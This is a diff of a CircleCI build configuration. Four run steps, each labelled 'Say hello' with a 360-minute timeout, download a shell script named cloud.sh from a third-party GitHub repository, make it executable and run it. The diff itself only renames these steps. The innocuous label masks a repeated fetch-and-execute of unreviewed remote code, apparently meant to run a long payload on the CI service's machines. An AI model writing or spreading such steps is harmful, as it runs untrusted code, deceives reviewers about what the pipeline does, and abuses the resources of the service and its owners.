@@ -11,25 +11,24 @@ jobs:
       - image: cimg/base:stable
     # Add steps to the job
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
-    
     steps:
       - checkout
-  
+      
       - run:
           no_output_timeout: 360m
           name: "Say hello"
           command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       - run:
           no_output_timeout: 360m
-          name: "Say hello1"
+          name: "Say hello"
           command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       - run:
           no_output_timeout: 360m
-          name: "Say hello2"
+          name: "Say hello"
           command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       - run:
           no_output_timeout: 360m
-          name: "Say hello3"
+          name: "Say hello"
           command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
